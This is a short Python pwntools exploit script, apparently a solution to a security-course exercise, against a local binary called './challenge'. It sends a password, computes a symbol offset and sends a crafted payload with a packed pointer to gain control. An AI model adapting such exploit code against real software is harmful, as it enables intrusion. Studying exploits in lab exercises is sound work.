#!/usr/bin/python3

from pwn import *

PROG_NAME = "./challenge"
LOCAL_LIBC = "/lib32/libc.so.6"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

p = process(PROG_NAME)
elf = p.elf
libc = ELF(LOCAL_LIBC)

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.sendline("neverstandstill")

offset = (elf.symbols['input_buf'] + 0x4 - elf.symbols['courses']) // 4

payload = b'14aa'
payload += p32(elf.symbols['input_buf'] + 0x8)
payload += b'./COMP6447'
print(payload)

p.sendline(payload)

p.interactive()